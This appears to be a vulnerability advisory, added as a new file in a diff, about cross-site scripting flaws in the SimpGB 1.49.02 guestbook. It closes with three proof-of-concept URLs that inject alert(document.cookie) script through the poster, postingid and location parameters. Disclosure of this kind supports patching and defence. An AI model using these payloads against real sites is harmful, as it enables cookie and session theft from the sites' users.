@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/46033/info
+
+SimpGB is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+SimpGB 1.49.02 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/guestbook.php?layout=Til&lang=en&mode=add&postingid=1&poster=%3Cscript%3Ealert(document.cookie)%3C/script%3E&input_text=111111111111111111111111111111&preview=preview
+
+http://www.example.com/guestbook.php?layout=Til&lang=en&mode=add&postingid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&poster=1&input_text=111111111111111111111111111111&preview=preview
+
+http://www.example.com/guestbook.php?layout=Til&lang=en&mode=add&postingid=1&poster=1&location=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&input_text=111111111111111111111111111111&preview=preview 
